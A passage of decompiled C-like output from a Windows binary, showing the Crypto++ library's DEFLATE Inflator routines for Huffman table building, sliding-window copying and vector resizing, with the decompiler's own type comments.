  v8 = a2;
  if ( a2 != (unsigned int *)v7 )
  {
    for ( i = a2 + 1; i != (unsigned int *)v7; ++i )
    {
      if ( *v8 < *i )
        v8 = i;
    }
  }
  v10 = *v8;
  *v5 = *v8;
  if ( v10 > 0x20 )
  {
    v56 = 15i64;
    v55 = 0i64;
    v54 = 0;
    sub_140004F20(&v54, "code length exceeds maximum", 0x1Bui64);
    v48 = 15i64;
    v47 = 0i64;
    LOBYTE(v46) = 0;
    sub_140004F20(&v46, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v49);
    v49 = &off_1400A8798;
    v50 = 4;
    v53 = 15i64;
    v52 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v46, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    if ( v48 >= 0x10 )
      operator delete(v46);
    v49 = &off_1400A8798;
    CxxThrowException(&v49, &_TI3_AVErr_cls_091_CryptoPP__);
  }
  if ( !v10 )
  {
    v48 = 15i64;
    v47 = 0i64;
    LOBYTE(v46) = 0;
    sub_140004F20(&v46, "null code", 9ui64);
    sub_140092EE0(&v49);
    CxxThrowException(&v49, &_TI3_AVErr_cls_091_CryptoPP__);
  }
  v11 = v10 + 1;
  v58 = 0;
  v59 = v11;
  if ( v11 > 0x10 )
  {
    sub_14004F230(v10 + 1);
    if ( v11 )
      v12 = (char *)sub_14003A000(4 * v11);
    else
      v12 = 0i64;
    v11 = v59;
  }
  else
  {
    v58 = 1;
    v12 = &v57;
  }
  v60 = v12;
  v13 = (unsigned __int64)&v12[4 * v11];
  v14 = 0i64;
  v15 = (4 * v11 + 3) >> 2;
  if ( (unsigned __int64)v12 > v13 )
    v15 = 0i64;
  if ( v15 )
  {
    do
    {
      *(_DWORD *)v12 = 0;
      v12 += 4;
      ++v14;
    }
    while ( v14 != v15 );
  }
  if ( v3 )
  {
    v16 = v4;
    do
    {
      ++*((_DWORD *)v60 + *v16);
      ++v16;
      --v6;
    }
    while ( v6 );
  }
  v17 = 0;
  v18 = *v5 + 1;
  v62 = 0;
  v63 = v18;
  if ( v18 > 0x10 )
  {
    sub_14004F230(v18);
    if ( v18 )
      v19 = (char *)sub_14003A000(4 * v18);
    else
      v19 = 0i64;
  }
  else
  {
    v62 = 1;
    v19 = &v61;
  }
  Memory = v19;
  *((_DWORD *)v19 + 1) = 0;
  for ( j = 2; j <= *v5; ++j )
  {
    v21 = v17 + *((_DWORD *)v60 + j - 1);
    if ( v17 > v21 )
    {
      v56 = 15i64;
      v55 = 0i64;
      v54 = 0;
      sub_140004F20(&v54, "codes oversubscribed", 0x14ui64);
      v48 = 15i64;
      v47 = 0i64;
      LOBYTE(v46) = 0;
      sub_140004F20(&v46, byte_1400A3400, 0i64);
      std::exception::exception((std::exception *)&v49);
      v49 = &off_1400A8798;
      v50 = 4;
      v53 = 15i64;
      v52 = 0i64;
      Dst = 0;
      sub_140004DF0(&Dst, &v46, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      if ( v48 >= 0x10 )
        operator delete(v46);
      v49 = &off_1400A8798;
      CxxThrowException(&v49, &_TI3_AVErr_cls_091_CryptoPP__);
    }
    v17 = 2 * v21;
    if ( v21 > 2 * v21 )
    {
      v56 = 15i64;
      v55 = 0i64;
      v54 = 0;
      sub_140004F20(&v54, "codes oversubscribed", 0x14ui64);
      v48 = 15i64;
      v47 = 0i64;
      LOBYTE(v46) = 0;
      sub_140004F20(&v46, byte_1400A3400, 0i64);
      std::exception::exception((std::exception *)&v49);
      v49 = &off_1400A8798;
      v50 = 4;
      v53 = 15i64;
      v52 = 0i64;
      Dst = 0;
      sub_140004DF0(&Dst, &v46, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      if ( v48 >= 0x10 )
        operator delete(v46);
      v49 = &off_1400A8798;
      CxxThrowException(&v49, &_TI3_AVErr_cls_091_CryptoPP__);
    }
    *((_DWORD *)Memory + j) = v17;
  }
  v22 = *v5;
  v23 = (1i64 << *v5) - *((unsigned int *)v60 + v22);
  if ( v17 > v23 )
  {
    v56 = 15i64;
    v55 = 0i64;
    v54 = 0;
    sub_140004F20(&v54, "codes oversubscribed", 0x14ui64);
    v48 = 15i64;
    v47 = 0i64;
    LOBYTE(v46) = 0;
    sub_140004F20(&v46, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v49);
    v49 = &off_1400A8798;
    v50 = 4;
    v53 = 15i64;
    v52 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v46, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    if ( v48 >= 0x10 )
      operator delete(v46);
    v49 = &off_1400A8798;
    CxxThrowException(&v49, &_TI3_AVErr_cls_091_CryptoPP__);
  }
  if ( (_DWORD)v22 != 1 && v17 < v23 )
  {
    v56 = 15i64;
    v55 = 0i64;
    v54 = 0;
    sub_140004F20(&v54, "codes incomplete", 0x10ui64);
    v48 = 15i64;
    v47 = 0i64;
    LOBYTE(v46) = 0;
    sub_140004F20(&v46, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v49);
    v49 = &off_1400A8798;
    v50 = 4;
    v53 = 15i64;
    v52 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v46, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    if ( v48 >= 0x10 )
      operator delete(v46);
    v49 = &off_1400A8798;
    CxxThrowException(&v49, &_TI3_AVErr_cls_091_CryptoPP__);
  }
  sub_140095DD0((__int64 *)v5 + 2, v3 - *(_DWORD *)v60);
  v24 = 0;
  v25 = 0;
  if ( v3 )
  {
    do
    {
      v26 = *v4;
      if ( (_DWORD)v26 )
      {
        v27 = (char *)Memory + 4 * v26;
        v28 = (*v27)++;
        v29 = 3i64 * v24;
        *(_DWORD *)(*((_QWORD *)v5 + 2) + 4 * v29) = v28 << (32 - v26);
        *(_DWORD *)(*((_QWORD *)v5 + 2) + 4 * v29 + 4) = v26;
        *(_DWORD *)(*((_QWORD *)v5 + 2) + 4 * v29 + 8) = v25;
        ++v24;
      }
      ++v25;
      ++v4;
    }
    while ( v25 < v3 );
  }
  sub_140092790(
    *((unsigned int **)v5 + 2),
    *((unsigned int **)v5 + 3),
    ((unsigned __int64)((unsigned __int128)((signed __int64)(*((_QWORD *)v5 + 3) - *((_QWORD *)v5 + 2))
                                          * (signed __int128)3074457345618258603i64) >> 64) >> 63)
  + ((signed __int64)((unsigned __int128)((signed __int64)(*((_QWORD *)v5 + 3) - *((_QWORD *)v5 + 2))
                                        * (signed __int128)3074457345618258603i64) >> 64) >> 1),
    0);
  v44 = 9;
  v30 = &v44;
  if ( *v5 < 9 )
    v30 = (int *)v5;
  v31 = *v30;
  v5[1] = *v30;
  v32 = (1 << v31) - 1;
  v5[2] = v32;
  v5[3] = v32 << (32 - v31);
  v33 = *((_QWORD *)v5 + 6) - *((_QWORD *)v5 + 5);
  if ( ((unsigned __int64)((unsigned __int128)(v33 * (signed __int128)3074457345618258603i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)(v33 * (signed __int128)3074457345618258603i64) >> 64) >> 2) != 1i64 << v31 )
    sub_140095F10((__int64)(v5 + 10), 1i64 << v31);
  v34 = 0;
  v35 = *((_QWORD *)v5 + 6) - *((_QWORD *)v5 + 5);
  if ( ((unsigned __int64)((unsigned __int128)(v35 * (signed __int128)3074457345618258603i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)(v35 * (signed __int128)3074457345618258603i64) >> 64) >> 2) )
  {
    v36 = 0i64;
    do
    {
      *(_DWORD *)(*((_QWORD *)v5 + 5) + 24 * v36) = 0;
      v36 = ++v34;
      v37 = *((_QWORD *)v5 + 6) - *((_QWORD *)v5 + 5);
    }
    while ( v34 < ((unsigned __int64)((unsigned __int128)(v37 * (signed __int128)3074457345618258603i64) >> 64) >> 63)
                + ((signed __int64)((unsigned __int128)(v37 * (signed __int128)3074457345618258603i64) >> 64) >> 2) );
  }
  v38 = Memory;
  v39 = Memory;
  v40 = v63;
  if ( Memory == &v61 )
  {
    v62 = 0;
    while ( v40 )
    {
      *v39 = 0;
      ++v39;
      --v40;
    }
  }
  else
  {
    while ( v40 )
    {
      *v39 = 0;
      ++v39;
      --v40;
    }
    free(v38);
  }
  v41 = v60;
  v42 = v60;
  v43 = v59;
  if ( v60 == &v57 )
  {
    while ( v43 )
    {
      *v42 = 0;
      ++v42;
      --v43;
    }
  }
  else
  {
    while ( v43 )
    {
      *v42 = 0;
      ++v42;
      --v43;
    }
    free(v41);
  }
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D4B00: using guessed type int _TI3_AVErr_cls_091_CryptoPP__;

//----- (0000000140095060) ----------------------------------------------------
char __fastcall sub_140095060(_QWORD *a1, char a2, char a3)
{
  _QWORD *v3; // rbx
  void *v5; // [rsp+28h] [rbp-A0h]
  __int64 v6; // [rsp+38h] [rbp-90h]
  unsigned __int64 v7; // [rsp+40h] [rbp-88h]
  __int64 (__fastcall **v8)(void *); // [rsp+50h] [rbp-78h]
  int v9; // [rsp+68h] [rbp-60h]
  char Dst; // [rsp+70h] [rbp-58h]
  __int64 v11; // [rsp+80h] [rbp-48h]
  __int64 v12; // [rsp+88h] [rbp-40h]
  char v13; // [rsp+90h] [rbp-38h]
  __int64 v14; // [rsp+A0h] [rbp-28h]
  __int64 v15; // [rsp+A8h] [rbp-20h]

  v3 = a1;
  if ( !a3 )
  {
    v15 = 15i64;
    v14 = 0i64;
    v13 = 0;
    sub_140004F20(&v13, "Inflator", 8ui64);
    v7 = 15i64;
    v6 = 0i64;
    LOBYTE(v5) = 0;
    sub_140004F20(&v5, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v8);
    v8 = &off_1400A8798;
    v9 = 0;
    v12 = 15i64;
    v11 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v5, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v8 = &off_1400A8798;
    if ( v7 >= 0x10 )
      operator delete(v5);
    v8 = &off_1400A8798;
    CxxThrowException(&v8, &_TI4_AUcls_081_cls_023_CryptoPP__);
  }
  if ( a2 )
    sub_1400955B0(a1, 1);
  if ( *((_DWORD *)v3 + 34) )
  {
    (*(void (__fastcall **)(_QWORD *, _QWORD, _QWORD))(*v3 + 400i64))(v3, v3[42] + v3[40], v3[41] - v3[42]);
    v3[42] = v3[41];
  }
  return 0;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D43D8: using guessed type int _TI4_AUcls_081_cls_023_CryptoPP__;

//----- (00000001400951D0) ----------------------------------------------------
_QWORD *__fastcall sub_1400951D0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  _QWORD *result; // rax
  int v4; // ecx

  *(_DWORD *)(a1 + 136) = 0;
  v2 = a1;
  (*(void (__fastcall **)(__int64, const char *, bool *, __int64))(*(_QWORD *)a2 + 8i64))(
    a2,
    "Repeat",
    &bool `RTTI Type Descriptor',
    a1 + 140);
  result = sub_140056840(v2 + 56);
  v4 = *(_DWORD *)(v2 + 300);
  *(_DWORD *)(v2 + 296) >>= v4;
  *(_DWORD *)(v2 + 300) -= v4;
  return result;
}
// 1400D9230: using guessed type bool bool `RTTI Type Descriptor';

//----- (0000000140095230) ----------------------------------------------------
__int64 __fastcall sub_140095230(_QWORD *a1, char a2)
{
  __int64 result; // rax
  _QWORD *v3; // rbx
  __int64 v4; // r8

  result = a1[41];
  v3 = a1;
  *(_BYTE *)(a1[40] + result) = a2;
  v4 = a1[39];
  if ( ++a1[41] == v4 )
  {
    (*(void (__fastcall **)(_QWORD *, _QWORD, __int64))(*a1 + 400i64))(a1, a1[40] + a1[42], v4 - a1[42]);
    result = 0i64;
    *((_BYTE *)v3 + 142) = 1;
    v3[42] = 0i64;
    v3[41] = 0i64;
  }
  return result;
}

//----- (00000001400952A0) ----------------------------------------------------
__int64 __fastcall sub_1400952A0(__int64 a1, unsigned int a2, unsigned int a3)
{
  __int64 v3; // rbx
  __int64 v4; // rsi
  unsigned __int64 v5; // rdi
  unsigned __int64 v6; // rdi
  unsigned __int64 v7; // rax
  unsigned __int64 v8; // rcx
  __int64 v9; // r8
  unsigned __int64 v10; // rcx
  __int64 result; // rax
  __int64 v12; // rdx
  __int64 v13; // r8
  char v14; // [rsp+20h] [rbp-78h]

  v3 = a1;
  v4 = a2;
  v5 = *(_QWORD *)(a1 + 328);
  if ( a3 > v5 )
  {
    if ( !*(_BYTE *)(a1 + 142) || (v7 = *(_QWORD *)(a1 + 312), a3 > v7) )
    {
      sub_140093100(&v14);
      CxxThrowException(&v14, &_TI4_AVcls_092_cls_087_CryptoPP__);
    }
    v6 = v7 - a3 + v5;
  }
  else
  {
    v6 = v5 - a3;
  }
  v8 = *(_QWORD *)(a1 + 312);
  if ( v6 + a2 > v8 )
  {
    if ( v6 < v8 )
    {
      do
      {
        *(_BYTE *)(*(_QWORD *)(v3 + 320) + *(_QWORD *)(v3 + 328)) = *(_BYTE *)(*(_QWORD *)(v3 + 320) + v6);
        v9 = *(_QWORD *)(v3 + 312);
        if ( ++*(_QWORD *)(v3 + 328) == v9 )
        {
          (*(void (__fastcall **)(__int64, _QWORD, __int64))(*(_QWORD *)v3 + 400i64))(
            v3,
            *(_QWORD *)(v3 + 336) + *(_QWORD *)(v3 + 320),
            v9 - *(_QWORD *)(v3 + 336));
          *(_QWORD *)(v3 + 336) = 0i64;
          *(_QWORD *)(v3 + 328) = 0i64;
          *(_BYTE *)(v3 + 142) = 1;
        }
        ++v6;
        v4 = (unsigned int)(v4 - 1);
      }
      while ( v6 < *(_QWORD *)(v3 + 312) );
    }
    v6 = 0i64;
  }
  v10 = *(_QWORD *)(v3 + 328);
  result = v4 + v6;
  if ( v4 + v6 > v10 || (result = v4 + v10, v4 + v10 >= *(_QWORD *)(v3 + 312)) )
  {
    for ( ; (_DWORD)v4; ++v6 )
    {
      v12 = *(_QWORD *)(v3 + 320);
      LODWORD(v4) = v4 - 1;
      result = *(unsigned __int8 *)(v12 + v6);
      *(_BYTE *)(v12 + *(_QWORD *)(v3 + 328)) = result;
      v13 = *(_QWORD *)(v3 + 312);
      if ( ++*(_QWORD *)(v3 + 328) == v13 )
      {
        result = (*(__int64 (__fastcall **)(__int64, _QWORD, __int64))(*(_QWORD *)v3 + 400i64))(
                   v3,
                   *(_QWORD *)(v3 + 336) + *(_QWORD *)(v3 + 320),
                   v13 - *(_QWORD *)(v3 + 336));
        *(_QWORD *)(v3 + 336) = 0i64;
        *(_QWORD *)(v3 + 328) = 0i64;
        *(_BYTE *)(v3 + 142) = 1;
      }
    }
  }
  else
  {
    result = (__int64)memcpy(
                        (void *)(*(_QWORD *)(v3 + 320) + v10),
                        (const void *)(*(_QWORD *)(v3 + 320) + v6),
                        (unsigned int)v4);
    *(_QWORD *)(v3 + 328) += (unsigned int)v4;
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D4B68: using guessed type int _TI4_AVcls_092_cls_087_CryptoPP__;

//----- (0000000140095490) ----------------------------------------------------
void *__fastcall sub_140095490(__int64 a1, char *a2, size_t a3)
{
  size_t v3; // rsi
  char *v4; // rbp
  __int64 v5; // rbx
  size_t v6; // rdi
  void *result; // rax
  __int64 v8; // r8

  if ( a3 )
  {
    v3 = a3;
    v4 = a2;
    v5 = a1;
    do
    {
      v6 = v3;
      if ( *(_QWORD *)(v5 + 312) - *(_QWORD *)(v5 + 328) < v3 )
        v6 = *(_QWORD *)(v5 + 312) - *(_QWORD *)(v5 + 328);
      result = memcpy((void *)(*(_QWORD *)(v5 + 320) + *(_QWORD *)(v5 + 328)), v4, v6);
      v8 = *(_QWORD *)(v5 + 312);
      *(_QWORD *)(v5 + 328) += v6;
      if ( *(_QWORD *)(v5 + 328) == v8 )
      {
        result = (void *)(*(__int64 (__fastcall **)(__int64, _QWORD, __int64))(*(_QWORD *)v5 + 400i64))(
                           v5,
                           *(_QWORD *)(v5 + 336) + *(_QWORD *)(v5 + 320),
                           v8 - *(_QWORD *)(v5 + 336));
        *(_QWORD *)(v5 + 336) = 0i64;
        *(_QWORD *)(v5 + 328) = 0i64;
        *(_BYTE *)(v5 + 142) = 1;
      }
      v4 += v6;
      v3 -= v6;
    }
    while ( v3 );
  }
  return result;
}

//----- (0000000140095570) ----------------------------------------------------
__int64 __fastcall sub_140095570(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rdi
  __int64 v5; // rax
  char v6; // ST20_1

  v3 = a3;
  v4 = a2;
  v5 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 328i64))();
  v6 = 1;
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD, char))(*(_QWORD *)v5 + 40i64))(
           v5,
           v4,
           v3,
           0i64,
           v6);
}

//----- (00000001400955B0) ----------------------------------------------------
char __fastcall sub_1400955B0(_QWORD *a1, char a2)
{
  char v2; // si
  _QWORD *v3; // rbx
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  __int64 v8; // rax
  __int64 v9; // rax
  unsigned __int64 v10; // rax
  unsigned __int64 v11; // rdi
  signed int v12; // eax
  unsigned __int64 v13; // rcx
  unsigned __int64 v14; // rdi
  __int64 v15; // rax
  char v16; // al
  __int64 v18; // [rsp+20h] [rbp-38h]
  __int64 v19; // [rsp+60h] [rbp+8h]

  v2 = a2;
  v3 = a1;
  do
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            v4 = *((_DWORD *)v3 + 34);
            if ( v4 )
              break;
            if ( !v2 )
            {
              v14 = sub_140056B70((__int64)(v3 + 7));
              LODWORD(v10) = (*(__int64 (__fastcall **)(_QWORD *))(*v3 + 384i64))(v3);
              if ( v14 < (unsigned int)v10 )
                return v10;
            }
            (*(void (__fastcall **)(_QWORD *))(*v3 + 392i64))(v3);
            v15 = *v3;
            *((_DWORD *)v3 + 34) = 1;
            *((_BYTE *)v3 + 142) = 0;
            v3[41] = 0i64;
            v3[42] = 0i64;
            v16 = (*(__int64 (__fastcall **)(_QWORD *))(v15 + 376))(v3);
            sub_140038C40((__int64)(v3 + 38), 1 << v16);
          }
          v5 = v4 - 1;
          if ( v5 )
            break;
          v10 = sub_140056B70((__int64)(v3 + 7));
          v13 = 591i64;
          if ( v2 )
            v13 = 1i64;
          if ( v10 < v13 )
            return v10;
          sub_140093E00((__int64)v3);
        }
        v6 = v5 - 1;
        if ( v6 )
          break;
        LOBYTE(v10) = sub_140093980((__int64)v3);
        if ( !(_BYTE)v10 )
          return v10;
      }
      v7 = v6 - 1;
      if ( v7 )
        break;
      if ( v2
        || (v11 = sub_140056B70((__int64)(v3 + 7)),
            LODWORD(v10) = (*(__int64 (__fastcall **)(_QWORD *))(*v3 + 408i64))(v3),
            v11 >= (unsigned int)v10) )
      {
        (*(void (__fastcall **)(_QWORD *))(*v3 + 416i64))(v3);
        v12 = 4;
        if ( *((_BYTE *)v3 + 140) )
          v12 = 0;
        *((_DWORD *)v3 + 34) = v12;
        LODWORD(v18) = (*(__int64 (__fastcall **)(_QWORD *))(*v3 + 112i64))(v3);
        sub_14005A600((__int64)v3, 0, 0i64, 0i64, v18, 1, (__int64)&qword_1400D8080);
        LOBYTE(v10) = sub_140056DB0(v3 + 7);
        if ( !(_BYTE)v10 )
          continue;
      }
      return v10;
    }
  }
  while ( v7 != 1 );
  v8 = *v3;
  v19 = -1i64;
  v9 = (*(__int64 (__fastcall **)(_QWORD *))(v8 + 328))(v3);
  LOBYTE(v18) = 1;
  LOBYTE(v10) = (*(__int64 (__fastcall **)(_QWORD *, __int64, __int64 *, void **, __int64))(v3[7] + 248i64))(
                  v3 + 7,
                  v9,
                  &v19,
                  &qword_1400D8080,
                  v18);
  return v10;
}

//----- (0000000140095A70) ----------------------------------------------------
unsigned __int64 __fastcall sub_140095A70(_QWORD *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r9
  unsigned __int64 v3; // rdx
  unsigned __int64 v4; // rdx
  unsigned __int64 result; // rax
  unsigned __int64 v6; // rdx

  v2 = a2;
  v3 = ((unsigned __int64)((unsigned __int128)((signed __int64)(a1[2] - *a1) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((signed __int64)(a1[2] - *a1) * (signed __int128)3074457345618258603i64) >> 64) >> 1);
  if ( 1537228672809129301i64 - (v3 >> 1) >= v3 )
  {
    v6 = (v3 >> 1) + v3;
    if ( v6 < v2 )
      v6 = v2;
    result = v6;
  }
  else
  {
    v4 = 0i64;
    if ( v2 > 0 )
      v4 = v2;
    result = v4;
  }
  return result;
}

//----- (0000000140095AD0) ----------------------------------------------------
unsigned __int64 __fastcall sub_140095AD0(_QWORD *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r9
  unsigned __int64 v3; // rdx
  unsigned __int64 v4; // rdx
  unsigned __int64 result; // rax
  unsigned __int64 v6; // rdx

  v2 = a2;
  v3 = ((unsigned __int64)((unsigned __int128)((signed __int64)(a1[2] - *a1) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((signed __int64)(a1[2] - *a1) * (signed __int128)3074457345618258603i64) >> 64) >> 2);
  if ( 768614336404564650i64 - (v3 >> 1) >= v3 )
  {
    v6 = (v3 >> 1) + v3;
    if ( v6 < v2 )
      v6 = v2;
    result = v6;
  }
  else
  {
    v4 = 0i64;
    if ( v2 > 0 )
      v4 = v2;
    result = v4;
  }
  return result;
}

//----- (0000000140095B30) ----------------------------------------------------
signed __int64 __fastcall sub_140095B30(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rbx
  __int64 *v3; // r14
  char *v4; // rsi
  void *v5; // r8
  unsigned __int64 v6; // r15
  unsigned __int64 v7; // rcx
  _DWORD *v8; // rdi
  signed __int64 result; // rax

  v2 = a2;
  v3 = a1;
  sub_1400935A0(a2);
  if ( v2 )
    v4 = (char *)sub_14003A000(12 * v2);
  else
    v4 = 0i64;
  sub_140092DE0(*v3, v3[1], (__int64)v4);
  v5 = (void *)*v3;
  v6 = ((unsigned __int64)((unsigned __int128)((v3[1] - *v3) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((v3[1] - *v3) * (signed __int128)3074457345618258603i64) >> 64) >> 1);
  if ( *v3 )
  {
    v7 = 3
       * (((unsigned __int64)((unsigned __int128)((v3[2] - (signed __int64)v5) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
        + ((signed __int64)((unsigned __int128)((v3[2] - (signed __int64)v5) * (signed __int128)3074457345618258603i64) >> 64) >> 1));
    v8 = (_DWORD *)*v3;
    while ( v7 )
    {
      *v8 = 0;
      ++v8;
      --v7;
    }
    free(v5);
  }
  v3[2] = (__int64)&v4[12 * v2];
  result = 3 * v6;
  v3[1] = (__int64)&v4[12 * v6];
  *v3 = (__int64)v4;
  return result;
}

//----- (0000000140095C30) ----------------------------------------------------
signed __int64 __fastcall sub_140095C30(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rbx
  __int64 *v3; // r14
  char *v4; // rsi
  void *v5; // r8
  unsigned __int64 v6; // r15
  signed __int64 result; // rax

  v2 = a2;
  v3 = a1;
  sub_140093690(a2);
  if ( v2 )
    v4 = (char *)sub_14003A000(24 * v2);
  else
    v4 = 0i64;
  sub_140092E20(*v3, v3[1], (__int64)v4);
  v5 = (void *)*v3;
  v6 = ((unsigned __int64)((unsigned __int128)((v3[1] - *v3) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((v3[1] - *v3) * (signed __int128)3074457345618258603i64) >> 64) >> 2);
  if ( *v3 )
  {
    memset(
      v5,
      0,
      24
    * (((unsigned __int64)((unsigned __int128)((v3[2] - (signed __int64)v5) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((v3[2] - (signed __int64)v5) * (signed __int128)3074457345618258603i64) >> 64) >> 2)));
    free(v5);
  }
  v3[2] = (__int64)&v4[24 * v2];
  result = 3 * v6;
  v3[1] = (__int64)&v4[24 * v6];
  *v3 = (__int64)v4;
  return result;
}

//----- (0000000140095D30) ----------------------------------------------------
__int64 __fastcall sub_140095D30(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r9
  __int64 *v3; // rbx
  __int64 v4; // rcx
  signed __int128 v5; // ax
  unsigned __int64 v6; // rdx
  unsigned __int64 v7; // rax

  v2 = a2;
  v3 = a1;
  v4 = a1[1];
  v5 = (v3[2] - v4) * (signed __int128)3074457345618258603i64;
  if ( (*((_QWORD *)&v5 + 1) >> 63) + (*((_QWORD *)&v5 + 1) >> 2) < v2 )
  {
    v6 = ((unsigned __int64)((unsigned __int128)((v4 - *v3) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
       + ((signed __int64)((unsigned __int128)((v4 - *v3) * (signed __int128)3074457345618258603i64) >> 64) >> 2);
    if ( 768614336404564650i64 - v6 < v2 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v7 = sub_140095AD0(v3, v2 + v6);
    *(_QWORD *)&v5 = sub_140095C30(v3, v7);
  }
  return v5;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140095DD0) ----------------------------------------------------
unsigned __int64 __fastcall sub_140095DD0(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rbx
  __int64 *v3; // rdi
  __int64 v4; // r10
  unsigned __int64 result; // rax
  unsigned __int64 v6; // r8
  signed __int64 v7; // rcx
  unsigned __int64 v8; // r9
  unsigned __int64 v9; // rax
  unsigned __int64 v10; // rbx

  v2 = a2;
  v3 = a1;
  v4 = a1[1];
  result = (unsigned __int64)((unsigned __int128)((a1[1] - *a1) * (signed __int128)3074457345618258603i64) >> 64) >> 63;
  v6 = result
     + ((signed __int64)((unsigned __int128)((a1[1] - *a1) * (signed __int128)3074457345618258603i64) >> 64) >> 1);
  if ( v6 <= a2 )
  {
    if ( v6 >= a2 )
      return result;
    v8 = a2 - v6;
    if ( ((unsigned __int64)((unsigned __int128)((a1[2] - v4) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
       + ((signed __int64)((unsigned __int128)((a1[2] - v4) * (signed __int128)3074457345618258603i64) >> 64) >> 1) < a2 - v6 )
    {
      if ( 1537228672809129301i64 - v6 < v8 )
      {
        std::_Xlength_error("vector<T> too long");
        __debugbreak();
      }
      v9 = sub_140095A70(v3, v6 + v8);
      sub_140095B30(v3, v9);
    }
    sub_140092D70(
      v3[1],
      v2
    - (((unsigned __int64)((unsigned __int128)((v3[1] - *v3) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((v3[1] - *v3) * (signed __int128)3074457345618258603i64) >> 64) >> 1)));
    v10 = v2
        - (((unsigned __int64)((unsigned __int128)((v3[1] - *v3) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
         + ((signed __int64)((unsigned __int128)((v3[1] - *v3) * (signed __int128)3074457345618258603i64) >> 64) >> 1));
    result = 3 * v10;
    v7 = v3[1] + 12 * v10;
  }
  else
  {
    result = 3 * (a2 - v6);
    v7 = v4 + 12 * (a2 - v6);
  }
  v3[1] = v7;
  return result;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140095F10) ----------------------------------------------------
unsigned __int64 __fastcall sub_140095F10(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rbx
  __int64 v3; // rdi
  __int64 v4; // rcx
  unsigned __int64 result; // rax
  unsigned __int64 v6; // r8
  signed __int64 v7; // rcx
  unsigned __int64 v8; // rbx

  v2 = a2;
  v3 = a1;
  v4 = *(_QWORD *)(a1 + 8);
  result = (unsigned __int64)((unsigned __int128)((v4 - *(_QWORD *)v3) * (signed __int128)3074457345618258603i64) >> 64) >> 63;
  v6 = result
     + ((signed __int64)((unsigned __int128)((v4 - *(_QWORD *)v3) * (signed __int128)3074457345618258603i64) >> 64) >> 2);
  if ( v6 <= a2 )
  {
    if ( v6 >= a2 )
      return result;
    sub_140095D30((__int64 *)v3, a2 - v6);
    sub_140092DA0(
      *(_QWORD **)(v3 + 8),
      v2
    - (((unsigned __int64)((unsigned __int128)((signed __int64)(*(_QWORD *)(v3 + 8) - *(_QWORD *)v3)
                                             * (signed __int128)3074457345618258603i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((signed __int64)(*(_QWORD *)(v3 + 8) - *(_QWORD *)v3)
                                           * (signed __int128)3074457345618258603i64) >> 64) >> 2)));
    v8 = v2
       - (((unsigned __int64)((unsigned __int128)((signed __int64)(*(_QWORD *)(v3 + 8) - *(_QWORD *)v3)
                                                * (signed __int128)3074457345618258603i64) >> 64) >> 63)
        + ((signed __int64)((unsigned __int128)((signed __int64)(*(_QWORD *)(v3 + 8) - *(_QWORD *)v3)
                                              * (signed __int128)3074457345618258603i64) >> 64) >> 2));
    result = 3 * v8;
    v7 = *(_QWORD *)(v3 + 8) + 24 * v8;
  }
  else
  {
    result = 3 * (a2 - v6);
    v7 = v4 + 24 * (a2 - v6);
  }
  *(_QWORD *)(v3 + 8) = v7;
  return result;
}

//----- (000000014009608D) ----------------------------------------------------
#error "1400960C1: positive sp value has been found (funcsize=14)"

//----- (00000001400960D2) ----------------------------------------------------
